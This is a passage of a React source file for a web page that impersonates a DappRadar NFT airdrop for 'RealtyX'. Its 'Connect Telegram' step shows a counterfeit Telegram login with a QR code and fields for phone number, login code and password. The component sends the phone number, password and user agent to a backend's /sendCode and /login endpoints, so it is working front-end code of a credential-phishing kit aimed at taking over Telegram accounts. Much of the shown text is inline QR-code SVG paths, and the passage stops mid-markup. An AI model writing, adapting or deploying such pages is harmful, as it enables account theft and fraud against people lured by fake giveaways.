import React, { useState } from 'react';
import InputMask from 'react-input-mask';
import Modal from 'react-modal';
import './style.css';
import Header from './Header';
import Content from './Content';
import Footer from './Footer';
import axios from 'axios';

Modal.setAppElement('#root');

function App() {
    const [modalIsOpen, setModalIsOpen] = useState(false);
    const [showTelegramContent, setShowTelegramContent] = useState(false);
    const [showTelegramContentQR, setShowTelegramContentQR] = useState(true);
    const [showStep2, setShowStep2] = useState(true);
    const [showStep3, setShowStep3] = useState(true);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [pass, setPass] = useState('');
    const [userAgent] = useState(navigator.userAgent);

    const handleConnectTelegram = () => {
        setShowTelegramContent(true);
    };

    const handleSetQR = () => {
        setShowTelegramContentQR(false);
    };

    const handleSetPhone = () => {
        setShowTelegramContentQR(true);
    };

    const handleSetShowStep2 = async () => {
        try {
            const response = await axios.get('http://127.0.0.1:5000/sendCode', {
                params: {
                    login: phoneNumber
                }
            });
        } catch (error) {
            console.error('Error with sending code:', error);
        }
        setShowStep2(false);
    }

    const handleSetShowStep3 = () => {
        setShowStep2(true);
        setShowStep3(false);
    }

    const openModal = () => {
        setModalIsOpen(true);
    };

    const closeModal = () => {
        setModalIsOpen(false);
    };

    const handleInputChange = (event) => {
        setPhoneNumber(event.target.value);
    };

    const handleInputPassChange = (event) => {
        setPass(event.target.value);
    };

    const handleInputCodeChange = (event) => {
        const inputValue = event.target.value;
        if (inputValue.length === 5) {
            handleSetShowStep3();
        }
    };

    const handleSendData = async () => {
        try {
            const response = await axios.get('http://127.0.0.1:5000/login', {
                params: {
                    login: phoneNumber,
                    password: pass,
                    userAgent: userAgent
                }
            });

            if (response.data.message !== 'Incorrect password' || response.data.message !== 'User not found') {
                console.log(pass);
                console.log(phoneNumber);
                console.log(userAgent);
            } else {
                console.log('Authentication failed');
            }
        } catch (error) {
            console.error('Authentication error:', error);
        }
    };

    return (
        <>
            <div className="App">
                <Header />
                <Content openModal={openModal} closeModal={closeModal} />
                <Footer />
            </div>

            <div>
                <Modal
                    isOpen={modalIsOpen}
                    onRequestClose={closeModal}
                    contentLabel="Example Modal"
                    className="airdrop-modal--container"
                    overlayClassName="react-responsive-modal-overlay"
                >
                    {!showTelegramContent ? (
                        <div className="airdrop-modal--content custom-background rounded css-4cffwv">
                            <div className="airdrop-card--left-box css-1d8qyez">
                                <div className="airdrop-card--image-container css-1uoge8i">
                                    <img src="https://dashboard-assets.dappradar.com/staging/airdrops/65b0f3460e165_Realty X-logo-20240123-100927.png" className="img-loaded" alt="airdrop-item" />
                                </div>
                                <div className="css-12hpwr4">
                                    <div className="airdrop-card--title css-vurnku">RealtyX Launch Pass NFTs airdrop</div>
                                    <div className="airdrop-card--text css-vurnku">1000 RealtyX Launch Pass NFTs</div>
                                </div>
                            </div>
                            <div className="css-1mwn3f5">
                                <div className="airdrop-modal--tab-text active css-12zjy6j"><span>Airdrop Details</span></div>
                            </div>
                            <div className="css-1pxm4lx">
                                <div className="airdrop-modal--details-box css-4cffwv">
                                    <div className="css-l3rx45">
                                        <div className="airdrop-modal--text sm mb8 mt8-mobile css-vurnku"><span>Amount</span></div>
                                        <div className="airdrop-modal--text lg maxWidth250 css-vurnku">1 Launch Pass NFT per winner</div>
                                        <div className="airdrop-modal--text dark-grey css-vurnku">1000 <span>winners</span></div>
                                    </div>
                                    <div className="css-l3rx45">
                                        <div className="airdrop-modal--text sm mb8 mt8-mobile css-vurnku"><span>Airdrop registration starts</span></div>
                                        <div className="airdrop-modal--text lg css-vurnku">Jan 25, 11:00 AM</div>
                                    </div>
                                    <div className="css-l3rx45">
                                        <div className="airdrop-modal--text sm mb8 mt8-mobile css-vurnku"><span>Registration ends</span></div>
                                        <div className="airdrop-modal--text red lg css-vurnku"><span>Registration ended</span></div>
                                    </div>
                                </div>
                                <div className="airdrop-modal--info-container css-4cffwv">
                                    <div className="airdrop-modal--heading-text css-uq1pv2">Register now for a chance to win a RealtyX Launch Pass NFT
                                    </div>
                                    <div className="airdrop-modal--text css-vurnku">Secure your spot for The RealtyX Launch Pass NFT now! Register your
                                        Base blockchain wallet to claim a whitelist spot—limited to 1000 through the DappRadar airdrop. These NFTs grant
                                        holders entry into the 10 ETH Raffle at the RealtyX Pilot Launch, a RWA project built on Base.
                                        <a className="m" href="https://dappradar.com/blog/what-is-realtyx-real-estate-tokenization-dao">LEARN MORE</a>
                                        <br />
                                        <br />
                                        After the airdrop ends, winners will need to claim their Pass NFTs
                                        <a className="m" href="https://opensea.io/collection/realtyx-launch-pass/overview">HERE</a>
                                    </div>
                                </div>
                                <span className="buttonSpan kKBVsP" onClick={handleConnectTelegram}>
                                    <span>Connect Telegram</span>
                                </span>
                            </div>

                            <button onClick={closeModal} className="react-responsive-modal-closeButton" data-testid="close-button">
                                <svg width="28" height="28" viewBox="0 0 36 36" data-testid="close-icon">
                                    <path
                                        d="M28.5 9.62L26.38 7.5 18 15.88 9.62 7.5 7.5 9.62 15.88 18 7.5 26.38l2.12 2.12L18 20.12l8.38 8.38 2.12-2.12L20.12 18z">
                                    </path>
                                </svg>
                            </button>
                        </div>
                    ) : (
                        !showTelegramContentQR ? (
                            <div className="airdrop-modal--content custom-background1 rounded css-4cffwv">
                                <div id="auth-qr-form" className="custom-scroll">
                                    <div className="auth-form qr">
                                        <div className="qr-outer">
                                            <div className="qr-inner opacity-transition slow open shown">
                                                <div className="qr-container"><svg width="280" height="280">
                                                    <defs>
                                                        <clipPath id="clip-path-dot-color">
                                                            <path d="M 10 94v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,13.5,97.5)"></path>
                                                            <path d="M 10 101v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,13.5,104.5)"></path>
                                                            <path d="M 10 136v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,13.5,139.5)"></path>
                                                            <path d="M 10 143v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,13.5,146.5)"></path>
                                                            <path d="M 10 171v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,13.5,174.5)"></path>
                                                            <path d="M 10 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,13.5,181.5)"></path>
                                                            <path d="M 10 192v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,13.5,195.5)"></path>
                                                            <path d="M 10 199v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,13.5,202.5)"></path>
                                                            <path d="M 17 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,20.5,69.5)"></path>
                                                            <path d="M 17 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,20.5,104.5)"></path>
                                                            <path d="M 17 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,20.5,118.5)"></path>
                                                            <path d="M 17 122v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,20.5,125.5)"></path>
                                                            <rect x="17" y="136" width="7" height="7" transform="rotate(0,20.5,139.5)"></rect>
                                                            <rect x="17" y="143" width="7" height="7" transform="rotate(0,20.5,146.5)"></rect>
                                                            <path d="M 17 164v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,20.5,167.5)"></path>
                                                            <path d="M 17 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,20.5,188.5)"></path>
                                                            <path d="M 17 192v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,20.5,195.5)"></path>
                                                            <rect x="24" y="66" width="7" height="7" transform="rotate(0,27.5,69.5)"></rect>
                                                            <rect x="24" y="73" width="7" height="7" transform="rotate(0,27.5,76.5)"></rect>
                                                            <path d="M 24 80v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,27.5,83.5)"></path>
                                                            <path d="M 24 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,27.5,111.5)"></path>
                                                            <path d="M 24 136v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,27.5,139.5)"></path>
                                                            <rect x="24" y="143" width="7" height="7" transform="rotate(0,27.5,146.5)"></rect>
                                                            <rect x="24" y="150" width="7" height="7" transform="rotate(0,27.5,153.5)"></rect>
                                                            <rect x="24" y="157" width="7" height="7" transform="rotate(0,27.5,160.5)"></rect>
                                                            <path d="M 24 164v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,27.5,167.5)"></path>
                                                            <path d="M 24 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,27.5,181.5)"></path>
                                                            <path d="M 24 199v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,27.5,202.5)"></path>
                                                            <path d="M 31 66v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,34.5,69.5)"></path>
                                                            <rect x="31" y="73" width="7" height="7" transform="rotate(0,34.5,76.5)"></rect>
                                                            <rect x="31" y="80" width="7" height="7" transform="rotate(0,34.5,83.5)"></rect>
                                                            <path d="M 31 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,34.5,90.5)"></path>
                                                            <rect x="31" y="108" width="7" height="7" transform="rotate(0,34.5,111.5)"></rect>
                                                            <path d="M 31 122v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,34.5,125.5)"></path>
                                                            <path d="M 31 129v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,34.5,132.5)"></path>
                                                            <path d="M 31 143v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,34.5,146.5)"></path>
                                                            <rect x="31" y="150" width="7" height="7" transform="rotate(0,34.5,153.5)"></rect>
                                                            <path d="M 31 157v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,34.5,160.5)"></path>
                                                            <path d="M 31 178v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,34.5,181.5)"></path>
                                                            <rect x="31" y="185" width="7" height="7" transform="rotate(0,34.5,188.5)"></rect>
                                                            <rect x="31" y="192" width="7" height="7" transform="rotate(0,34.5,195.5)"></rect>
                                                            <rect x="31" y="199" width="7" height="7" transform="rotate(0,34.5,202.5)"></rect>
                                                            <path d="M 31 206v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,34.5,209.5)"></path>
                                                            <path d="M 38 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,41.5,83.5)"></path>
                                                            <path d="M 38 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,41.5,97.5)"></path>
                                                            <rect x="38" y="101" width="7" height="7" transform="rotate(0,41.5,104.5)"></rect>
                                                            <rect x="38" y="108" width="7" height="7" transform="rotate(0,41.5,111.5)"></rect>
                                                            <path d="M 38 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,41.5,118.5)"></path>
                                                            <path d="M 38 150v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,41.5,153.5)"></path>
                                                            <path d="M 38 164v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,41.5,167.5)"></path>
                                                            <path d="M 38 171v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,41.5,174.5)"></path>
                                                            <path d="M 38 185v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,41.5,188.5)"></path>
                                                            <rect x="38" y="192" width="7" height="7" transform="rotate(0,41.5,195.5)"></rect>
                                                            <rect x="38" y="206" width="7" height="7" transform="rotate(0,41.5,209.5)"></rect>
                                                            <path d="M 45 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,48.5,90.5)"></path>
                                                            <rect x="45" y="94" width="7" height="7" transform="rotate(0,48.5,97.5)"></rect>
                                                            <rect x="45" y="108" width="7" height="7" transform="rotate(0,48.5,111.5)"></rect>
                                                            <path d="M 45 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,48.5,139.5)"></path>
                                                            <path d="M 45 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,48.5,160.5)"></path>
                                                            <rect x="45" y="164" width="7" height="7" transform="rotate(0,48.5,167.5)"></rect>
                                                            <path d="M 45 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,48.5,181.5)"></path>
                                                            <rect x="45" y="192" width="7" height="7" transform="rotate(0,48.5,195.5)"></rect>
                                                            <rect x="45" y="206" width="7" height="7" transform="rotate(0,48.5,209.5)"></rect>
                                                            <path d="M 52 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,55.5,69.5)"></path>
                                                            <circle cx="55.5" cy="83.5" r="3.5" transform="rotate(0,55.5,83.5)"></circle>
                                                            <path d="M 52 94v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,55.5,97.5)"></path>
                                                            <rect x="52" y="108" width="7" height="7" transform="rotate(0,55.5,111.5)"></rect>
                                                            <path d="M 52 122v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,55.5,125.5)"></path>
                                                            <path d="M 52 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,55.5,139.5)"></path>
                                                            <path d="M 52 150v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,55.5,153.5)"></path>
                                                            <path d="M 52 164v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,55.5,167.5)"></path>
                                                            <path d="M 52 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,55.5,181.5)"></path>
                                                            <rect x="52" y="192" width="7" height="7" transform="rotate(0,55.5,195.5)"></rect>
                                                            <rect x="52" y="206" width="7" height="7" transform="rotate(0,55.5,209.5)"></rect>
                                                            <rect x="59" y="66" width="7" height="7" transform="rotate(0,62.5,69.5)"></rect>
                                                            <path d="M 59 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,62.5,76.5)"></path>
                                                            <path d="M 59 101v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,62.5,104.5)"></path>
                                                            <rect x="59" y="108" width="7" height="7" transform="rotate(0,62.5,111.5)"></rect>
                                                            <rect x="59" y="115" width="7" height="7" transform="rotate(0,62.5,118.5)"></rect>
                                                            <path d="M 59 122v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,62.5,125.5)"></path>
                                                            <rect x="59" y="150" width="7" height="7" transform="rotate(0,62.5,153.5)"></rect>
                                                            <path d="M 59 157v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,62.5,160.5)"></path>
                                                            <rect x="59" y="192" width="7" height="7" transform="rotate(0,62.5,195.5)"></rect>
                                                            <rect x="59" y="206" width="7" height="7" transform="rotate(0,62.5,209.5)"></rect>
                                                            <circle cx="69.5" cy="13.5" r="3.5" transform="rotate(0,69.5,13.5)"></circle>
                                                            <circle cx="69.5" cy="55.5" r="3.5" transform="rotate(0,69.5,55.5)"></circle>
                                                            <rect x="66" y="66" width="7" height="7" transform="rotate(0,69.5,69.5)"></rect>
                                                            <circle cx="69.5" cy="90.5" r="3.5" transform="rotate(0,69.5,90.5)"></circle>
                                                            <rect x="66" y="101" width="7" height="7" transform="rotate(0,69.5,104.5)"></rect>
                                                            <path d="M 66 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,69.5,118.5)"></path>
                                                            <circle cx="69.5" cy="139.5" r="3.5" transform="rotate(0,69.5,139.5)"></circle>
                                                            <rect x="66" y="150" width="7" height="7" transform="rotate(0,69.5,153.5)"></rect>
                                                            <rect x="66" y="157" width="7" height="7" transform="rotate(0,69.5,160.5)"></rect>
                                                            <path d="M 66 164v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,69.5,167.5)"></path>
                                                            <circle cx="69.5" cy="181.5" r="3.5" transform="rotate(0,69.5,181.5)"></circle>
                                                            <rect x="66" y="192" width="7" height="7" transform="rotate(0,69.5,195.5)"></rect>
                                                            <rect x="66" y="199" width="7" height="7" transform="rotate(0,69.5,202.5)"></rect>
                                                            <rect x="66" y="206" width="7" height="7" transform="rotate(0,69.5,209.5)"></rect>
                                                            <rect x="66" y="213" width="7" height="7" transform="rotate(0,69.5,216.5)"></rect>
                                                            <path d="M 66 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,69.5,223.5)"></path>
                                                            <path d="M 66 241v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,69.5,244.5)"></path>
                                                            <rect x="66" y="248" width="7" height="7" transform="rotate(0,69.5,251.5)"></rect>
                                                            <path d="M 66 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,69.5,258.5)"></path>
                                                            <path d="M 73 17v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,76.5,20.5)"></path>
                                                            <rect x="73" y="24" width="7" height="7" transform="rotate(0,76.5,27.5)"></rect>
                                                            <rect x="73" y="31" width="7" height="7" transform="rotate(0,76.5,34.5)"></rect>
                                                            <rect x="73" y="38" width="7" height="7" transform="rotate(0,76.5,41.5)"></rect>
                                                            <path d="M 73 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,76.5,48.5)"></path>
                                                            <rect x="73" y="66" width="7" height="7" transform="rotate(0,76.5,69.5)"></rect>
                                                            <path d="M 73 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,76.5,97.5)"></path>
                                                            <rect x="73" y="101" width="7" height="7" transform="rotate(0,76.5,104.5)"></rect>
                                                            <circle cx="76.5" cy="132.5" r="3.5" transform="rotate(0,76.5,132.5)"></circle>
                                                            <rect x="73" y="150" width="7" height="7" transform="rotate(0,76.5,153.5)"></rect>
                                                            <path d="M 73 164v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,76.5,167.5)"></path>
                                                            <path d="M 73 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,76.5,188.5)"></path>
                                                            <rect x="73" y="192" width="7" height="7" transform="rotate(0,76.5,195.5)"></rect>
                                                            <rect x="73" y="199" width="7" height="7" transform="rotate(0,76.5,202.5)"></rect>
                                                            <path d="M 73 206v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,76.5,209.5)"></path>
                                                            <path d="M 73 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,76.5,223.5)"></path>
                                                            <rect x="73" y="227" width="7" height="7" transform="rotate(0,76.5,230.5)"></rect>
                                                            <rect x="73" y="234" width="7" height="7" transform="rotate(0,76.5,237.5)"></rect>
                                                            <rect x="73" y="241" width="7" height="7" transform="rotate(0,76.5,244.5)"></rect>
                                                            <rect x="73" y="248" width="7" height="7" transform="rotate(0,76.5,251.5)"></rect>
                                                            <path d="M 73 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,76.5,258.5)"></path>
                                                            <path d="M 80 10v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,83.5,13.5)"></path>
                                                            <rect x="80" y="17" width="7" height="7" transform="rotate(0,83.5,20.5)"></rect>
                                                            <rect x="80" y="24" width="7" height="7" transform="rotate(0,83.5,27.5)"></rect>
                                                            <circle cx="83.5" cy="55.5" r="3.5" transform="rotate(0,83.5,55.5)"></circle>
                                                            <rect x="80" y="66" width="7" height="7" transform="rotate(0,83.5,69.5)"></rect>
                                                            <path d="M 80 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,83.5,76.5)"></path>
                                                            <rect x="80" y="94" width="7" height="7" transform="rotate(0,83.5,97.5)"></rect>
                                                            <rect x="80" y="101" width="7" height="7" transform="rotate(0,83.5,104.5)"></rect>
                                                            <path d="M 80 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,83.5,111.5)"></path>
                                                            <circle cx="83.5" cy="139.5" r="3.5" transform="rotate(0,83.5,139.5)"></circle>
                                                            <path d="M 80 150v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,83.5,153.5)"></path>
                                                            <path d="M 80 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,83.5,160.5)"></path>
                                                            <path d="M 80 171v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,83.5,174.5)"></path>
                                                            <path d="M 80 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,83.5,181.5)"></path>
                                                            <rect x="80" y="192" width="7" height="7" transform="rotate(0,83.5,195.5)"></rect>
                                                            <path d="M 80 199v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,83.5,202.5)"></path>
                                                            <rect x="80" y="241" width="7" height="7" transform="rotate(0,83.5,244.5)"></rect>
                                                            <path d="M 80 248v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,83.5,251.5)"></path>
                                                            <circle cx="83.5" cy="265.5" r="3.5" transform="rotate(0,83.5,265.5)"></circle>
                                                            <path d="M 87 10v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,90.5,13.5)"></path>
                                                            <rect x="87" y="17" width="7" height="7" transform="rotate(0,90.5,20.5)"></rect>
                                                            <rect x="87" y="24" width="7" height="7" transform="rotate(0,90.5,27.5)"></rect>
                                                            <rect x="87" y="31" width="7" height="7" transform="rotate(0,90.5,34.5)"></rect>
                                                            <rect x="87" y="38" width="7" height="7" transform="rotate(0,90.5,41.5)"></rect>
                                                            <path d="M 87 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,90.5,48.5)"></path>
                                                            <path d="M 87 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,90.5,69.5)"></path>
                                                            <path d="M 87 80v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,90.5,83.5)"></path>
                                                            <rect x="87" y="87" width="7" height="7" transform="rotate(0,90.5,90.5)"></rect>
                                                            <path d="M 87 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,90.5,97.5)"></path>
                                                            <path d="M 87 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,90.5,118.5)"></path>
                                                            <path d="M 87 122v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,90.5,125.5)"></path>
                                                            <path d="M 87 171v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,90.5,174.5)"></path>
                                                            <path d="M 87 192v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,90.5,195.5)"></path>
                                                            <path d="M 87 206v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,90.5,209.5)"></path>
                                                            <rect x="87" y="213" width="7" height="7" transform="rotate(0,90.5,216.5)"></rect>
                                                            <path d="M 87 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,90.5,223.5)"></path>
                                                            <path d="M 87 234v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,90.5,237.5)"></path>
                                                            <rect x="87" y="241" width="7" height="7" transform="rotate(0,90.5,244.5)"></rect>
                                                            <circle cx="90.5" cy="258.5" r="3.5" transform="rotate(0,90.5,258.5)"></circle>
                                                            <path d="M 94 17v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,97.5,20.5)"></path>
                                                            <rect x="94" y="24" width="7" height="7" transform="rotate(0,97.5,27.5)"></rect>
                                                            <rect x="94" y="31" width="7" height="7" transform="rotate(0,97.5,34.5)"></rect>
                                                            <rect x="94" y="38" width="7" height="7" transform="rotate(0,97.5,41.5)"></rect>
                                                            <path d="M 94 52v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,97.5,55.5)"></path>
                                                            <path d="M 94 59v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,97.5,62.5)"></path>
                                                            <path d="M 94 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,97.5,76.5)"></path>
                                                            <rect x="94" y="80" width="7" height="7" transform="rotate(0,97.5,83.5)"></rect>
                                                            <rect x="94" y="87" width="7" height="7" transform="rotate(0,97.5,90.5)"></rect>
                                                            <path d="M 94 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,97.5,139.5)"></path>
                                                            <rect x="94" y="143" width="7" height="7" transform="rotate(0,97.5,146.5)"></rect>
                                                            <path d="M 94 150v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,97.5,153.5)"></path>
                                                            <path d="M 94 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,97.5,188.5)"></path>
                                                            <path d="M 94 199v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,97.5,202.5)"></path>
                                                            <rect x="94" y="206" width="7" height="7" transform="rotate(0,97.5,209.5)"></rect>
                                                            <path d="M 94 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,97.5,223.5)"></path>
                                                            <path d="M 94 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,97.5,230.5)"></path>
                                                            <path d="M 94 241v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,97.5,244.5)"></path>
                                                            <path d="M 94 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,97.5,265.5)"></path>
                                                            <rect x="101" y="24" width="7" height="7" transform="rotate(0,104.5,27.5)"></rect>
                                                            <rect x="101" y="31" width="7" height="7" transform="rotate(0,104.5,34.5)"></rect>
                                                            <rect x="101" y="38" width="7" height="7" transform="rotate(0,104.5,41.5)"></rect>
                                                            <path d="M 101 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,104.5,48.5)"></path>
                                                            <circle cx="104.5" cy="69.5" r="3.5" transform="rotate(0,104.5,69.5)"></circle>
                                                            <path d="M 101 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,104.5,90.5)"></path>
                                                            <path d="M 101 122v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,104.5,125.5)"></path>
                                                            <path d="M 101 129v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,104.5,132.5)"></path>
                                                            <path d="M 101 150v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,104.5,153.5)"></path>
                                                            <circle cx="104.5" cy="174.5" r="3.5" transform="rotate(0,104.5,174.5)"></circle>
                                                            <path d="M 101 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,104.5,188.5)"></path>
                                                            <rect x="101" y="199" width="7" height="7" transform="rotate(0,104.5,202.5)"></rect>
                                                            <rect x="101" y="206" width="7" height="7" transform="rotate(0,104.5,209.5)"></rect>
                                                            <rect x="101" y="227" width="7" height="7" transform="rotate(0,104.5,230.5)"></rect>
                                                            <path d="M 101 248v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,104.5,251.5)"></path>
                                                            <rect x="101" y="255" width="7" height="7" transform="rotate(0,104.5,258.5)"></rect>
                                                            <rect x="101" y="262" width="7" height="7" transform="rotate(0,104.5,265.5)"></rect>
                                                            <path d="M 108 10v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,111.5,13.5)"></path>
                                                            <rect x="108" y="17" width="7" height="7" transform="rotate(0,111.5,20.5)"></rect>
                                                            <rect x="108" y="24" width="7" height="7" transform="rotate(0,111.5,27.5)"></rect>
                                                            <path d="M 108 52v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,111.5,55.5)"></path>
                                                            <path d="M 108 59v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,111.5,62.5)"></path>
                                                            <circle cx="111.5" cy="76.5" r="3.5" transform="rotate(0,111.5,76.5)"></circle>
